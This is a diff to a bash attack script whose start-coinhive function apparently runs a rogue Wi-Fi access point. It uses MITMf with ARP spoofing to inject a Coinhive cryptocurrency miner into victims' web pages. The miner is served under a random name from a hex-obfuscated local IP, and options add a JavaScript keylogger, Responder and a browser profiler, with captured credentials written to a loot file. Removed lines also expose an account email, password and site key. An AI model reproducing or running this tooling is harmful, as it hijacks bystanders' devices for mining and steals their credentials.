@@ -142,15 +142,25 @@ start_mitmdump(){
 start-coinhive(){
 #https://github.com/byt3bl33d3r/MITMf/
 #https://null-byte.wonderhowto.com/how-to/inject-coinhive-miners-into-public-wi-fi-hotspots-0182250/
-#https://coinhive.com/settings/sites #user: i1123977@nwytg.com #pass: i1123977 #public-site-key: FUq2rCkflht7xM7o3RB8t6W2SyMutCNY
+#https://coinhive.com/settings/sites #Email: i1123977@nwytg.com #public-site-key: FUq2rCkflht7xM7o3RB8t6W2SyMutCNY
 #https://coin-hive.com/lib/coinhive.min.js #Miner js file
- gateway="192.168.2.254"
 #Public-site-key from: https://coinhive.com/settings/sites
- PUB_SITE_KEY="FUq2rCkflht7xM7o3RB8t6W2SyMutCNY"
+ PUB_SITE_KEY=""
+ gateway=""
 
-echo "Use gateway? $gateway and;"
-echo "Use Coinhive Public Site Key? $PUB_SITE_KEY"
-read -p "(ctrl-c to abort)"
+#Restart networking service
+echo -e "$txtgrn [*] Restarting networking service $endclr"
+ /etc/init.d/networking restart
+
+if [ -z $gateway ]; then
+  read -t 3 -p "[?] Wheres your gateway?(e.g 192.168.2.254|192.168.0.1|10.0.0.1) [>]" ans; echo ""
+fi
+echo -e "$txtgrn [*] Using gateway: $gateway $endclr"
+
+if [ -z $PUB_SITE_KEY ]; then
+  read -t 3 -p "[?] What is your Coinhive Public-Site-Key [>]" ans; echo ""
+fi
+echo -e "$txtgrn [*] Using Coinhive Public Site Key: $PUB_SITE_KEY $endclr"
 
 echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
@@ -160,55 +170,67 @@ echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
 #  ifconfig $upstream down
 #   macchanger -r $upstream
 #  ifconfig $upstream up
-echo -e "$txtgrn [*] Generating new name for payload $endclr"
- payload_random="$(openssl rand -hex 16).js$endclr"
-echo -e "$txtgrn [*] New name for payload=$payload_random $endclr"
-echo -e "$txtgrn [*] Copying coinhive config-file $endclr"
+
+#Generate new random name for payload: coinhive.min.js
+ payload_random="$(openssl rand -hex 16).js"
+#Copy and rename payload: coinhive.min.js to new random name
  cp $share/coinhive-js/coinhive.min.js $share/coinhive-js/$payload_random
 
-echo -e "$txtgrn [*] Replacing pub site key in miner.js $endclr"
+#Place Coinhive pub-site-key in miner.js
  sed -i "s|.*$Coinhive.Anonymous('.*$|var miner = new CoinHive.Anonymous('$PUB_SITE_KEY');|g" $share/coinhive-js/miner.js
 
+#Get local ip
 IP_ADDR="$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')" ;\
+ echo -e "$txtgrn [*] Using local ip: $IP_ADDR $endclr"
+  read -n 1 -t 3 -p "[?] Is this correct (y/n) [>]" askip ;echo ""
+   if [ -z $askip ];then
+     echo -e "$txtgrn [*] Assuming local ip is correct $endclr"
+   fi
+    case $ans in
+     n|n) read -p "[*] What is your correct local ip?" IP_ADDR ; echo -e "\n $txtgrn [*] Using ip: $IP_ADDR $endclr" ;;
+    esac
+ 
+#Convert local ip to hex
 IP_ADDR_HEX="$(printf '%02X' $(echo ${IP_ADDR//./ }) ; echo)"
- echo -e "$txtgrn [*] Using for payload and converting ip: $IP_ADDR to hex format & storing it in miner.js $endclr"
- sed -i "s|https://coinhive.com/lib/coinhive.min.js|http://$IP_ADDR_HEX/$payload_random|g" $share/coinhive-js/miner.js
+#Place local hexed-ip in miner.js
+ sed -i "s|.*script src.*|<script src=\"http://0x$IP_ADDR_HEX/$payload_random\"</script>|g" $share/coinhive-js/miner.js
 
-echo -e "$txtgrn [*] Restarting networking service $endclr"
- /etc/init.d/networking restart
-
+#Start http-server for serving payload
 echo -e "$txtgrn [*] Starting httpyserver for serving payload: $payload_random $endclr"
  cd $share/coinhive-js/ && xterm -hold -T "Httpyserver" -e python3 -m http.server 80 &
 
+#Make logdir to stop complains of MITMf
 mkdir -p /tmp/MITMf_logs/logs
 cd /tmp/MITMf_logs/
 
-read -p "Use additional addons for MITMf?(y/n) [>]" -n1 ans
+#Ask for extra addons
+read -p "[?] Use extra addons for MITMf?(y/n) [>]" -n1 -t 5 ans
  if [ $ans = "" ];then
-  echo -e "$txtred [*] No input! Using no additional addons $endclr"
+  echo -e "$txtred [*] Executing MITMf w/o extra addons $endclr"
   ans="no"
  fi
-
-echo -e "$txtgrn [*] Starting MITMf $endclr"
+echo -e "$txtgrn [*] MITMf logs can be found in: /tmp/MITMf_logs/logs $endclr"
+echo -e "$txtgrn [*] Starting MITMf.. $endclr"
  case $ans in
   y|Y|Yes|yes|YES) $share/MITMf/./mitmf.py -i $upstream --inject --js-file $share/coinhive-js/miner.js --arp --spoof --gateway $gateway --screen --browserprofiler --responder --analyze --jskeylo$ ;;
   n|N|No|no|NO)  $share/MITMf/./mitmf.py -i $upstream --inject --js-file $share/coinhive-js/miner.js --arp --spoof --gateway $gateway& ;;
-  *) echo -e "$txtred [*] Wrong input!,exiting.. $endclr"; sleep 3 ;exit ;;
+  *) echo -e "$txtred [*] Wrong input,exiting.. $endclr"; sleep 3 ;exit ;;
  esac
 
 	hangon && #Wait for Enter key
 	killem	  #Kill all shit and exit
 }
+
 hangon(){
         echo -e "\n"
-        echo -e "$txtgrn [*]The captured traffic will be in $loot \n $endclr"
-        echo -e "$txtgrn [*]and $etc/run-mana/credentials.txt \n $endclr"
-        echo -e "$txtred [>] Hit enter to kill me $endclr"
+        echo -e "$txtgrn [*] Captured traffic will be in $loot \n $endclr"
+        echo -e "$txtgrn [*] and $etc/run-mana/credentials.txt \n $endclr"
+        echo -e "$txtred [>] Hit enter to stop scripts $endclr"
          read
 }
 
 killem(){
-        echo -e "$txtred [X] [*] Killing....$endclr"
+        echo -e "$txtred [X] [*] Stopping..$endclr"
         service apache2 stop
 
         pkill -f airbase
@@ -242,10 +264,9 @@ killem(){
         iptables --policy FORWARD ACCEPT
         iptables --policy OUTPUT ACCEPT
         iptables -t nat -F
-echo -e "$txtred [*] Dont forget to kill msfconsole $endclr"
+echo -e "$txtred [*] Dont forget to kill msfconsole \n $txtgrn Done$endclr"
 exit
 }
-
 
 start-nat-full(){
 export conf=$share/run-mana/conf/hostapd.conf_open
